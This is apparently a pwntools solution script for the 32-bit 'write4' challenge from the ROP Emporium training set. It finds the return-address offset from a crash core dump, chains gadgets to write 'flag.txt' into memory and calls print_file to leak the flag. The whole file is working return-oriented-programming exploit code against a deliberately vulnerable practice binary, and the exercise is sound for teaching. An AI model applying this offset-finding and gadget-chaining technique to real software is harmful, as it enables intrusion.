from pwn import *

bin = '/home/kali/Downloads/ropemporium/challenge4/32/write432'
bin= ELF(bin)
context.binary = bin
context.log_level = 'debug'

p= process(bin.path)
p.sendline(cyclic(400))
p.wait_for_close()
core= p.corefile

leak= core.eip  
offset= cyclic_find(leak)   # 64 bit n=8
print(f"Found offset {offset}")

str1= b"flag"
flag= int.from_bytes(str1, "little")
str2= b".txt"
txt= int.from_bytes(str2, "little")
addr= 0x804a020
addr2= 0x804a024

print= bin.plt['print_file']

ga1= next(bin.search(asm('pop edi; pop ebp; ret;')))
ga2= next(bin.search(asm('mov dword ptr [edi], ebp; ret;')))
ga3= next(bin.search(asm('ret;')))

rop= flat(b'A'* offset, p32(ga1), p32(addr), p32(flag), p32(ga2), p32(ga1), p32(addr2), p32(txt), p32(ga2), p32(ga3),p32(print), p32(ga1), p32(addr) )

p2= process(bin.path)
p2.sendline(rop)
p2.interactive()
